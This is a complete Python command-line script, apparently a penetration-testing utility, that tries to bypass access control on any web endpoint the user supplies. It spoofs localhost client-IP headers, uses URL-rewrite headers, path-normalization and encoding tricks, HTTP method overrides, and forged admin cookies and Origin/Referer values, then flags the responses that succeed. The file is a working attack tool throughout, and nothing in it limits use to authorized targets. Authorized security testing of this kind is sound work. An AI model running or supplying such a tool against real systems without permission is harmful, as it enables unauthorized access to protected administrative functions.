#!/usr/bin/env python3
"""
auth_bypass.py — access control bypass tester
by K52-ai

Sends variations of one request against a protected endpoint to test
for header injection, path normalization, HTTP method override,
case/encoding quirks, cookie trust, and referer/origin checks.

Usage:
    python3 auth_bypass.py
    python3 auth_bypass.py -u https://target.com/admin
    python3 auth_bypass.py -u https://target.com/admin -c "session=abc"
    python3 auth_bypass.py -u https://target.com/admin -H "Authorization: Bearer xyz"
    python3 auth_bypass.py -u https://target.com/admin -v
"""

import argparse
import hashlib
import sys
import requests
from urllib.parse import urlparse, urlunparse

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# ─────────────────────────────────────────────────────────────
#  rainbow banner
# ─────────────────────────────────────────────────────────────
RAINBOW = [91, 93, 92, 96, 94, 95]   # red yellow green cyan blue magenta
RESET = "\033[0m"
BOLD = "\033[1m"


def rainbow_line(s, offset=0):
    out = []
    for i, ch in enumerate(s):
        color = RAINBOW[(i + offset) % len(RAINBOW)]
        out.append(f"\033[{color}m{ch}")
    out.append(RESET)
    return "".join(out)


BANNER_ART = [
    r" ____  __. .________________                  .__           ",
    r"|    |/ _| |   ____/\_____  \          _____  |__|          ",
    r"|      <   |____  \  /  ____/   ______ \__  \ |  |          ",
    r"|    |  \  /       \/       \  /_____/  / __ \|  |          ",
    r"|____|__ \/______  /\_______ \         (____  /__|          ",
    r"        \/       \/         \/              \/              ",
]


def print_banner():
    print()
    for i, line in enumerate(BANNER_ART):
        print(rainbow_line(line, offset=i))
    print()
    print(rainbow_line("   AUTH BYPASS — access control tester", offset=2))
    print(rainbow_line("   by K52-ai", offset=4))
    print(rainbow_line("   " + "═" * 40, offset=1))
    print()


# ─────────────────────────────────────────────────────────────
#  colors for status lines
# ─────────────────────────────────────────────────────────────
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
DIM = "\033[2m"
WHITE = "\033[97m"


def info(msg):
    print(f"{CYAN}[*]{RESET} {msg}")


def bypass(msg):
    print(f"{MAGENTA}{BOLD}[BYPASS]{RESET} {msg}")


def different(msg):
    print(f"{YELLOW}[DIFFERENT]{RESET} {msg}")


def unchanged(msg):
    print(f"{DIM}[-]{RESET} {msg}")


def fail(msg):
    print(f"{RED}{BOLD}[-]{RESET} {RED}{msg}{RESET}")


def good(msg):
    print(f"{GREEN}{BOLD}[+]{RESET} {GREEN}{msg}{RESET}")


# ─────────────────────────────────────────────────────────────
#  HTTP helpers
# ─────────────────────────────────────────────────────────────
DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0 Safari/537.36"
)


def send(url, method="GET", headers=None, cookies=None, timeout=10):
    hdrs = {"User-Agent": DEFAULT_UA}
    if headers:
        hdrs.update(headers)
    try:
        r = requests.request(
            method, url, headers=hdrs, cookies=cookies,
            timeout=timeout, verify=False, allow_redirects=False,
        )
        body = r.text if r.text else ""
        return {
            "status": r.status_code,
            "length": len(body),
            "hash": hashlib.md5(body.encode("utf-8", "ignore")).hexdigest()[:10],
            "location": r.headers.get("Location", ""),
            "error": None,
        }
    except Exception as exc:
        return {
            "status": None, "length": 0, "hash": "",
            "location": "", "error": type(exc).__name__,
        }


def parse_cookies(cookie_str):
    if not cookie_str:
        return None
    out = {}
    for part in cookie_str.split(";"):
        if "=" in part:
            k, v = part.split("=", 1)
            out[k.strip()] = v.strip()
    return out


# ─────────────────────────────────────────────────────────────
#  variation builders — each returns list of (label, kwargs)
# ─────────────────────────────────────────────────────────────
def build_header_variations():
    ips = [
        "127.0.0.1", "127.0.0.1, 127.0.0.1",
        "localhost", "::1", "0.0.0.0",
    ]
    out = []
    for ip in ips:
        out.append((f"X-Forwarded-For: {ip}", {"headers": {"X-Forwarded-For": ip}}))
        out.append((f"X-Real-IP: {ip}", {"headers": {"X-Real-IP": ip}}))
        out.append((f"X-Client-IP: {ip}", {"headers": {"X-Client-IP": ip}}))
    out += [
        ("X-Forwarded-Host: 127.0.0.1", {"headers": {"X-Forwarded-Host": "127.0.0.1"}}),
        ("X-Forwarded-Prefix: /admin", {"headers": {"X-Forwarded-Prefix": "/admin"}}),
        ("X-Original-URL: /admin", {"headers": {"X-Original-URL": "/admin"}}),
        ("X-Rewrite-URL: /admin", {"headers": {"X-Rewrite-URL": "/admin"}}),
        ("X-Remote-Addr: 127.0.0.1", {"headers": {"X-Remote-Addr": "127.0.0.1"}}),
        ("X-Originating-IP: 127.0.0.1", {"headers": {"X-Originating-IP": "127.0.0.1"}}),
        ("True-Client-IP: 127.0.0.1", {"headers": {"True-Client-IP": "127.0.0.1"}}),
        ("CF-Connecting-IP: 127.0.0.1", {"headers": {"CF-Connecting-IP": "127.0.0.1"}}),
    ]
    return out


def build_path_variations(base_url):
    p = urlparse(base_url)
    path = p.path or "/"
    variants = [
        path + "/",
        "//" + path.lstrip("/"),
        "/./" + path.lstrip("/"),
        path + "/.",
        path + "%20",
        path + "%2f",
        path + "/..;/" + path.lstrip("/"),
        path + ";.css",
        path.upper(),
        path.lower(),
        path + "%00",
        path + "?",
        path + "#",
        path + "/.",
        path + "/..;/",
    ]
    out = []
    seen = set()
    for v in variants:
        if not v.startswith("/"):
            v = "/" + v
        if v in seen:
            continue
        seen.add(v)
        new_url = urlunparse((p.scheme, p.netloc, v, "", p.query, ""))
        out.append((f"path: {v}", {"url": new_url}))
    return out


def build_method_variations():
    methods = ["POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE"]
    out = [(f"method: {m}", {"method": m}) for m in methods]
    override = ["PUT", "PATCH", "DELETE", "POST"]
    for m in override:
        out.append((
            f"X-HTTP-Method-Override: {m}",
            {"method": "POST", "headers": {"X-HTTP-Method-Override": m}},
        ))
        out.append((
            f"X-HTTP-Method: {m}",
            {"method": "POST", "headers": {"X-HTTP-Method": m}},
        ))
        out.append((
            f"X-Method-Override: {m}",
            {"method": "POST", "headers": {"X-Method-Override": m}},
        ))
    return out


def build_cookie_variations():
    names = ["admin", "role", "is_admin", "authenticated", "debug", "test", "dev"]
    out = []
    for n in names:
        out.append((f"Cookie: {n}=1", {"cookies": {n: "1"}}))
    out.append(("Cookie: admin=true", {"cookies": {"admin": "true"}}))
    out.append(("Cookie: role=admin", {"cookies": {"role": "admin"}}))
    out.append(("Cookie: role=administrator", {"cookies": {"role": "administrator"}}))
    return out


def build_origin_variations(base_url):
    p = urlparse(base_url)
    origin = f"{p.scheme}://{p.netloc}"
    return [
        (f"Referer: {origin}{p.path}", {"headers": {"Referer": origin + (p.path or "/")}}),
        (f"Referer: {origin}/", {"headers": {"Referer": origin + "/"}}),
        (f"Origin: {origin}", {"headers": {"Origin": origin}}),
        ("Origin: null", {"headers": {"Origin": "null"}}),
    ]


def build_encoding_variations(base_url):
    p = urlparse(base_url)
    path = p.path or "/"
    variants = [
        path.replace("a", "%61", 1),
        path.replace("d", "%64", 1),
        path.replace("m", "%6d", 1),
        path.replace("i", "%69", 1),
        path.replace("/", "%2F", 1),
        "%2e" + path,
        "%252e" + path,
        path + ".json",
        path + ".html",
    ]
    out = []
    for v in variants:
        if not v.startswith("/"):
            v = "/" + v
        new_url = urlunparse((p.scheme, p.netloc, v, "", p.query, ""))
        out.append((f"encoding: {v}", {"url": new_url}))
    return out


# ─────────────────────────────────────────────────────────────
#  runner
# ─────────────────────────────────────────────────────────────
def run_variation(base_url, label, kwargs, baseline, cookie_str):
    url = kwargs.pop("url", base_url)
    method = kwargs.pop("method", "GET")
    headers = kwargs.pop("headers", None)
    cookies = kwargs.pop("cookies", None)

    if cookie_str and cookies is None:
        cookies = parse_cookies(cookie_str)
    elif cookie_str and cookies is not None:
        merged = parse_cookies(cookie_str)
        merged.update(cookies)
        cookies = merged

    result = send(url, method=method, headers=headers, cookies=cookies)

    if result["error"]:
        return ("error", label, result, "request failed: " + result["error"])

    if baseline["status"] is None:
        return ("error", label, result, "baseline invalid")

    b_status = baseline["status"]
    b_len = baseline["length"]
    b_hash = baseline["hash"]

    r_status = result["status"]
    r_len = result["length"]
    r_hash = result["hash"]

    if r_status == b_status and r_hash == b_hash:
        return ("unchanged", label, result, "identical")

    if r_status != b_status and r_status in (200, 201, 202, 204):
        return ("bypass", label, result, f"status {b_status} -> {r_status}")

    if r_status != b_status:
        return ("different", label, result, f"status {b_status} -> {r_status}")

    delta = r_len - b_len
    pct = (delta / b_len * 100) if b_len else 0
    return ("different", label, result, f"length {b_len} -> {r_len} ({pct:+.0f}%)")


def print_section(title, count):
    print()
    print(f"{CYAN}[*]{RESET} {title} {DIM}({count} variations){RESET}")


def summarize(kind, label, result, reason):
    if kind == "bypass":
        bypass(f"{label}")
        print(f"          {DIM}{reason}{RESET}")
    elif kind == "different":
        different(f"{label}")
        print(f"          {DIM}{reason}{RESET}")
    elif kind == "error":
        fail(f"{label} — {reason}")


def save_report(path, base_url, baseline, hits):
    with open(path, "w", encoding="utf-8") as f:
        f.write(f"target: {base_url}\n")
        f.write(f"baseline_status: {baseline['status']}\n")
        f.write(f"baseline_length: {baseline['length']}\n")
        f.write(f"baseline_hash: {baseline['hash']}\n\n")
        for kind, label, result, reason in hits:
            if kind == "unchanged":
                continue
            f.write(f"[{kind.upper()}] {label} | {reason}\n")


# ─────────────────────────────────────────────────────────────
#  main
# ─────────────────────────────────────────────────────────────
def normalize(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url


def main():
    parser = argparse.ArgumentParser(
        description="auth_bypass — access control bypass tester (K52-ai)",
    )
    parser.add_argument("-u", "--url", help="target URL")
    parser.add_argument("-c", "--cookie", help="session cookie string")
    parser.add_argument("-H", "--header", action="append", help="extra header (repeatable)")
    parser.add_argument("-t", "--timeout", type=int, default=10)
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("-o", "--output", default="results.txt")
    args = parser.parse_args()

    print_banner()

    url = args.url
    if not url:
        try:
            url = input("target: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return 1
    if not url:
        fail("no target provided")
        return 1
    url = normalize(url)

    cookie_str = args.cookie
    if cookie_str is None:
        try:
            cookie_str = input("cookie (leave empty for none): ").strip()
        except (EOFError, KeyboardInterrupt):
            cookie_str = ""
        if not cookie_str:
            cookie_str = None

    extra_headers = {}
    for h in (args.header or []):
        if ":" in h:
            k, v = h.split(":", 1)
            extra_headers[k.strip()] = v.strip()

    print()
    good(f"target: {url}")
    if cookie_str:
        info(f"cookie: {cookie_str[:30]}{'...' if len(cookie_str) > 30 else ''}")
    if extra_headers:
        info(f"extra headers: {len(extra_headers)}")

    info("fetching baseline...")
    baseline = send(url, headers=extra_headers or None,
                    cookies=parse_cookies(cookie_str), timeout=args.timeout)
    if baseline["error"]:
        fail(f"baseline failed: {baseline['error']}")
        return 2

    print(f"{CYAN}[*]{RESET} baseline: {baseline['status']} "
          f"({baseline['length']} bytes, hash={baseline['hash']})")

    if baseline["status"] in (200, 201, 202, 204):
        info("endpoint is already accessible — running variations anyway")

    # collect all variations
    sections = [
        ("header injection", build_header_variations()),
        ("path normalization", build_path_variations(url)),
        ("method override", build_method_variations()),
        ("case / encoding", build_encoding_variations(url)),
        ("cookie manipulation", build_cookie_variations()),
        ("referer / origin", build_origin_variations(url)),
    ]

    all_hits = []
    total = 0
    counts = {"bypass": 0, "different": 0, "unchanged": 0, "error": 0}

    for section_name, variations in sections:
        print_section(section_name, len(variations))
        for label, kwargs in variations:
            kw = dict(kwargs)
            if "headers" in kw and extra_headers:
                merged = dict(extra_headers)
                merged.update(kw["headers"])
                kw["headers"] = merged
            elif "headers" not in kw and extra_headers:
                kw["headers"] = dict(extra_headers)

            kind, lbl, result, reason = run_variation(url, label, kw, baseline, cookie_str)
            total += 1
            counts[kind] = counts.get(kind, 0) + 1
            if kind in ("bypass", "different", "error"):
                summarize(kind, lbl, result, reason)
            elif args.verbose:
                unchanged(f"{lbl} ({reason})")
            all_hits.append((kind, lbl, result, reason))

    # summary
    print()
    print(rainbow_line("═" * 40, offset=3))
    print(f"  {BOLD}RESULT{RESET}")
    print(rainbow_line("═" * 40, offset=3))
    print(f"  tested:    {total}")
    print(f"  {MAGENTA}bypasses:  {counts.get('bypass', 0)}{RESET}")
    print(f"  {YELLOW}different: {counts.get('different', 0)}{RESET}")
    print(f"  {DIM}unchanged: {counts.get('unchanged', 0)}{RESET}")
    print(rainbow_line("═" * 40, offset=3))

    bypasses = [h for h in all_hits if h[0] == "bypass"]
    if bypasses:
        print()
        good(f"{len(bypasses)} bypass(es) found:")
        for _, label, _, reason in bypasses:
            print(f"  {MAGENTA}→{RESET} {label} {DIM}({reason}){RESET}")

    save_report(args.output, url, baseline, all_hits)
    print()
    info(f"saved to: {args.output}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
